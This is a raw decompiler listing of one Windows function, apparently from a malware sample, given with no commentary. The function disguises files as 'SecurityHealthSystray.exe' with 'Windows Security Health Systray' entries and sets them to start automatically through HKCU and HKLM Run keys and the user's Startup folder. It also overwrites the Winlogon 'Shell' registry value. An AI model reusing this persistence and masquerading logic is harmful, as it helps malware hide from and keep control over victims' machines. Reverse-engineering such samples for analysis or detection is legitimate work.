
/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_140013e00(void)

{
  char *_Str;
  code *pcVar1;
  undefined4 uVar2;
  LSTATUS LVar3;
  undefined8 uVar4;
  int extraout_var;
  char *_Str_00;
  size_t sVar5;
  undefined8 *puVar6;
  longlong *plVar7;
  longlong lVar8;
  longlong lVar9;
  BYTE *****pppppBVar10;
  BYTE ****ppppBVar11;
  ulonglong uVar12;
  ulonglong uVar13;
  uint uVar14;
  undefined1 *puVar15;
  undefined1 *puVar16;
  undefined1 *puVar17;
  undefined1 *puVar18;
  ulonglong uVar19;
  undefined8 uStackY_160;
  undefined1 auStackY_158 [8];
  undefined1 auStackY_150 [24];
  HKEY local_118;
  undefined4 local_110;
  BYTE ****local_108;
  longlong lStack_100;
  longlong local_f8;
  ulonglong uStack_f0;
  BYTE ****local_e8;
  undefined **ppuStack_e0;
  undefined8 local_d8;
  ulonglong local_d0;
  longlong local_c8;
  longlong lStack_c0;
  longlong local_b8;
  ulonglong uStack_b0;
  undefined1 local_a8;
  undefined7 uStack_a7;
  ulonglong local_98;
  ulonglong local_90;
  longlong local_88 [2];
  longlong local_78;
  ulonglong local_70;
  longlong local_68 [2];
  longlong local_58;
  ulonglong local_50;
  ulonglong local_48;
  
  puVar17 = auStackY_158;
  puVar15 = auStackY_158;
  puVar16 = auStackY_158;
  local_48 = DAT_140068100 ^ (ulonglong)auStackY_158;
  uVar19 = 0;
  local_110 = 0;
  FUN_140012c50(local_68);
  puVar18 = auStackY_158;
  if (local_58 == 0) goto LAB_140014598;
  FUN_140011d90(&local_a8);
  if (local_98 != 0) {
    local_e8 = (BYTE ****)&local_108;
    puVar17 = &local_a8;
    if (0xf < local_90) {
      puVar17 = (undefined1 *)CONCAT71(uStack_a7,local_a8);
    }
    uVar2 = __std_fs_code_page();
    lStack_100 = 0;
    local_f8 = 0;
    uStack_f0 = 7;
    local_108 = (BYTE ****)0x0;
    local_110 = 0x40;
    if (local_98 != 0) {
      if (0x7fffffff < local_98) {
                    /* WARNING: Subroutine does not return */
        FUN_140008c80();
      }
      uVar4 = FUN_140023fbc(uVar2,puVar17,local_98 & 0xffffffff,0);
      if ((int)((ulonglong)uVar4 >> 0x20) != 0) {
                    /* WARNING: Subroutine does not return */
        FUN_140009000();
      }
      FUN_140016170(&local_108,(longlong)(int)uVar4,0);
      pppppBVar10 = &local_108;
      if (7 < uStack_f0) {
        pppppBVar10 = (BYTE *****)local_108;
      }
      FUN_140023fbc(uVar2,puVar17,local_98 & 0xffffffff,pppppBVar10);
      if (extraout_var != 0) {
                    /* WARNING: Subroutine does not return */
        FUN_140009000(extraout_var);
      }
    }
    local_e8 = (BYTE ****)((ulonglong)local_e8 & 0xffffffff00000000);
    ppuStack_e0 = &PTR_vftable_140068d78;
    FUN_14000ae10(&local_108,&local_e8);
    if ((int)local_e8 != 0) {
                    /* WARNING: Subroutine does not return */
      FUN_14000a5e0("create_directories",&local_e8,&local_108);
    }
    FUN_140018e20(&local_108);
    uVar13 = uVar19;
    do {
      uVar4 = FUN_140012070(local_88,(&PTR_s_SecurityHealthSystray.exe_14005a398)[uVar13]);
      FUN_140012ee0(local_68,uVar4);
      if (0xf < local_70) {
        uVar12 = local_70 + 1;
        lVar9 = local_88[0];
        if (0xfff < uVar12) {
          lVar9 = *(longlong *)(local_88[0] + -8);
          puVar17 = auStackY_158;
          if (0x1f < (local_88[0] - lVar9) - 8U) goto LAB_140014538;
          uVar12 = local_70 + 0x28;
        }
        FUN_140026c34(lVar9,uVar12);
      }
      uVar14 = (int)uVar13 + 1;
      uVar13 = (ulonglong)uVar14;
    } while ((int)uVar14 < 3);
    FUN_140011ec0(local_88);
    LVar3 = RegOpenKeyExA((HKEY)&DAT_ffffffff80000001,
                          "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,2,&local_118);
    uVar13 = uVar19;
    if (LVar3 == 0) {
      do {
        FUN_140012070(&local_108,(&PTR_s_SecurityHealthSystray.exe_14005a398)[uVar13]);
        if (local_f8 != 0) {
          pppppBVar10 = &local_108;
          if (0xf < uStack_f0) {
            pppppBVar10 = (BYTE *****)local_108;
          }
          RegSetValueExA(local_118,(&PTR_s_Windows_Security_Health_Systray_14005a3b0)[uVar13],0,1,
                         (BYTE *)pppppBVar10,(int)local_f8 + 1);
        }
        if (0xf < uStack_f0) {
          uVar12 = uStack_f0 + 1;
          pppppBVar10 = (BYTE *****)local_108;
          if (0xfff < uVar12) {
            pppppBVar10 = (BYTE *****)local_108[-1];
            puVar17 = auStackY_158;
            if ((BYTE *)0x1f < (BYTE *)((longlong)local_108 + (-8 - (longlong)pppppBVar10)))
            goto LAB_1400144f7;
            uVar12 = uStack_f0 + 0x28;
          }
          FUN_140026c34(pppppBVar10,uVar12);
        }
        uVar14 = (int)uVar13 + 1;
        uVar13 = (ulonglong)uVar14;
      } while ((int)uVar14 < 3);
      RegCloseKey(local_118);
    }
    LVar3 = RegOpenKeyExA((HKEY)&DAT_ffffffff80000002,
                          "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,2,&local_118);
    uVar13 = uVar19;
    if (LVar3 == 0) {
      do {
        FUN_140012070(&local_108,(&PTR_s_SecurityHealthSystray.exe_14005a398)[uVar13]);
        if (local_f8 != 0) {
          pppppBVar10 = &local_108;
          if (0xf < uStack_f0) {
            pppppBVar10 = (BYTE *****)local_108;
          }
          RegSetValueExA(local_118,(&PTR_s_Windows_Security_Health_Systray_14005a3b0)[uVar13],0,1,
                         (BYTE *)pppppBVar10,(int)local_f8 + 1);
        }
        if (0xf < uStack_f0) {
          uVar12 = uStack_f0 + 1;
          pppppBVar10 = (BYTE *****)local_108;
          if (0xfff < uVar12) {
            pppppBVar10 = (BYTE *****)local_108[-1];
            puVar17 = auStackY_158;
            if ((BYTE *)0x1f < (BYTE *)((longlong)local_108 + (-8 - (longlong)pppppBVar10)))
            goto LAB_1400144f7;
            uVar12 = uStack_f0 + 0x28;
          }
          FUN_140026c34(pppppBVar10,uVar12);
        }
        uVar14 = (int)uVar13 + 1;
        uVar13 = (ulonglong)uVar14;
      } while ((int)uVar14 < 3);
      RegCloseKey(local_118);
    }
    _Str_00 = (char *)common_getenv<>("APPDATA");
    if (_Str_00 != (char *)0x0) {
      do {
        _Str = (&PTR_s_SecurityHealthSystray.exe_14005a398)[uVar19];
        local_e8 = (BYTE ****)0x0;
        ppuStack_e0 = (undefined **)0x0;
        local_d8 = 0;
        local_d0 = 0;
        sVar5 = strlen(_Str_00);
        FUN_140017f00(&local_e8,_Str_00,sVar5);
        puVar6 = (undefined8 *)
                 FUN_1400183c0(&local_e8,"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
                               0x2f);
        local_108 = (BYTE ****)*puVar6;
        lStack_100 = puVar6[1];
        local_f8 = puVar6[2];
        uStack_f0 = puVar6[3];
        puVar6[2] = 0;
        puVar6[3] = 0xf;
        *(undefined1 *)puVar6 = 0;
        sVar5 = strlen(_Str);
        plVar7 = (longlong *)FUN_1400183c0(&local_108,_Str,sVar5);
        local_c8 = *plVar7;
        lStack_c0 = plVar7[1];
        local_b8 = plVar7[2];
        uStack_b0 = plVar7[3];
        plVar7[2] = 0;
        plVar7[3] = 0xf;
        *(undefined1 *)plVar7 = 0;
        if (0xf < uStack_f0) {
          uVar13 = uStack_f0 + 1;
          pppppBVar10 = (BYTE *****)local_108;
          if (uVar13 < 0x1000) {
LAB_1400142b1:
            FUN_140026c34(pppppBVar10,uVar13);
            goto LAB_1400142b6;
          }
          pppppBVar10 = (BYTE *****)local_108[-1];
          if ((BYTE *)((longlong)local_108 + (-8 - (longlong)pppppBVar10)) < (BYTE *)0x20) {
            uVar13 = uStack_f0 + 0x28;
            goto LAB_1400142b1;
          }
          pcVar1 = (code *)swi(0x29);
          (*pcVar1)(5);
          puVar15 = auStackY_150;
LAB_140014444:
          pcVar1 = (code *)swi(0x29);
          lVar9 = (*pcVar1)(5);
          puVar16 = puVar15 + 8;
          goto LAB_14001444e;
        }
LAB_1400142b6:
        local_f8 = 0;
        uStack_f0 = 0xf;
        local_108 = (BYTE ****)((ulonglong)local_108 & 0xffffffffffffff00);
        if (0xf < local_d0) {
          uVar13 = local_d0 + 1;
          ppppBVar11 = local_e8;
          if (0xfff < uVar13) {
            ppppBVar11 = (BYTE ****)local_e8[-1];
            if (0x1f < (ulonglong)((longlong)local_e8 + (-8 - (longlong)ppppBVar11)))
            goto LAB_140014444;
            uVar13 = local_d0 + 0x28;
          }
          FUN_140026c34(ppppBVar11,uVar13);
        }
        local_d8 = 0;
        local_d0 = 0xf;
        local_e8 = (BYTE ****)((ulonglong)local_e8 & 0xffffffffffffff00);
        FUN_140012ee0(local_68,&local_c8);
        if (0xf < uStack_b0) {
          uVar13 = uStack_b0 + 1;
          lVar9 = local_c8;
          if (0xfff < uVar13) {
            lVar9 = *(longlong *)(local_c8 + -8);
            puVar17 = auStackY_158;
            if (0x1f < (local_c8 - lVar9) - 8U) goto LAB_1400144f7;
            uVar13 = uStack_b0 + 0x28;
          }
          FUN_140026c34(lVar9,uVar13);
        }
        uVar14 = (int)uVar19 + 1;
        uVar19 = (ulonglong)uVar14;
      } while ((int)uVar14 < 3);
    }
    puVar17 = auStackY_158;
    if (local_78 != 0) {
      if (0x7fffffffffffffffU - local_78 < 0xe) {
                    /* WARNING: Subroutine does not return */
        FUN_140008850();
      }
      FUN_140019110(&local_c8);
      plVar7 = (longlong *)FUN_1400183c0(&local_c8,&DAT_14005c0f0,1);
      local_108 = (BYTE ****)*plVar7;
      lStack_100 = plVar7[1];
      local_f8 = plVar7[2];
      uStack_f0 = plVar7[3];
      plVar7[2] = 0;
      plVar7[3] = 0xf;
      *(undefined1 *)plVar7 = 0;
      if (uStack_b0 < 0x10) {
LAB_140014453:
        *(undefined1 **)(puVar16 + 0x20) = puVar16 + 0x40;
        *(undefined8 *)(puVar16 + -8) = 0x14001447a;
        LVar3 = RegOpenKeyExA((HKEY)&DAT_ffffffff80000002,
                              "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",0,2,
                              *(PHKEY *)(puVar16 + 0x20));
        if (LVar3 == 0) {
          puVar17 = puVar16 + 0x50;
          if (0xf < *(ulonglong *)(puVar16 + 0x68)) {
            puVar17 = *(undefined1 **)(puVar16 + 0x50);
          }
          *(int *)(puVar16 + 0x28) = *(int *)(puVar16 + 0x60) + 1;
          *(undefined1 **)(puVar16 + 0x20) = puVar17;
          *(undefined8 *)(puVar16 + -8) = 0x1400144b9;
          RegSetValueExA(*(HKEY *)(puVar16 + 0x40),"Shell",0,1,*(BYTE **)(puVar16 + 0x20),
                         *(DWORD *)(puVar16 + 0x28));
          *(undefined8 *)(puVar16 + -8) = 0x1400144c4;
          RegCloseKey(*(HKEY *)(puVar16 + 0x40));
        }
        puVar17 = puVar16;
        if (*(ulonglong *)(puVar16 + 0x68) < 0x10) goto LAB_140014507;
        lVar9 = *(longlong *)(puVar16 + 0x50);
        if ((0xfff < *(ulonglong *)(puVar16 + 0x68) + 1) &&
           (lVar8 = lVar9 - *(longlong *)(lVar9 + -8), lVar9 = *(longlong *)(lVar9 + -8),
           0x1f < lVar8 - 8U)) goto LAB_1400144f7;
      }
      else {
        lVar9 = local_c8;
        puVar16 = auStackY_158;
        if ((uStack_b0 + 1 < 0x1000) ||
           (lVar9 = *(longlong *)(local_c8 + -8), puVar17 = auStackY_158, puVar16 = auStackY_158,
           (local_c8 - lVar9) - 8U < 0x20)) {
LAB_14001444e:
          *(undefined8 *)(puVar16 + -8) = 0x140014453;
          FUN_140026c34(lVar9);
          goto LAB_140014453;
        }
LAB_1400144f7:
        pcVar1 = (code *)swi(0x29);
        lVar9 = (*pcVar1)(5);
        puVar17 = puVar17 + 8;
      }
      *(undefined8 *)(puVar17 + -8) = 0x140014506;
      FUN_140026c34(lVar9);
    }
LAB_140014507:
    if (0xf < local_70) {
      lVar9 = local_88[0];
      if ((0xfff < local_70 + 1) &&
         (lVar9 = *(longlong *)(local_88[0] + -8), 0x1f < (local_88[0] - lVar9) - 8U)) {
LAB_140014538:
        pcVar1 = (code *)swi(0x29);
        lVar9 = (*pcVar1)(5);
        puVar17 = puVar17 + 8;
      }
      *(undefined8 *)(puVar17 + -8) = 0x140014547;
      FUN_140026c34(lVar9);
    }
  }
  if (0xf < local_90) {
    lVar8 = CONCAT71(uStack_a7,local_a8);
    lVar9 = lVar8;
    if ((0xfff < local_90 + 1) && (lVar9 = *(longlong *)(lVar8 + -8), 0x1f < (lVar8 - lVar9) - 8U))
    {
      pcVar1 = (code *)swi(0x29);
      lVar9 = (*pcVar1)(5);
      puVar17 = puVar17 + 8;
    }
    *(undefined8 *)(puVar17 + -8) = 0x140014588;
    FUN_140026c34(lVar9);
  }
  local_98 = 0;
  local_90 = 0xf;
  local_a8 = 0;
  puVar18 = puVar17;
LAB_140014598:
  if (0xf < local_50) {
    lVar9 = local_68[0];
    if ((0xfff < local_50 + 1) &&
       (lVar9 = *(longlong *)(local_68[0] + -8), 0x1f < (local_68[0] - lVar9) - 8U)) {
      pcVar1 = (code *)swi(0x29);
      lVar9 = (*pcVar1)(5);
      puVar18 = puVar18 + 8;
    }
    *(undefined8 *)(puVar18 + -8) = 0x1400145d8;
    FUN_140026c34(lVar9);
  }
  *(undefined8 *)(puVar18 + -8) = 0x1400145e4;
  return;
}

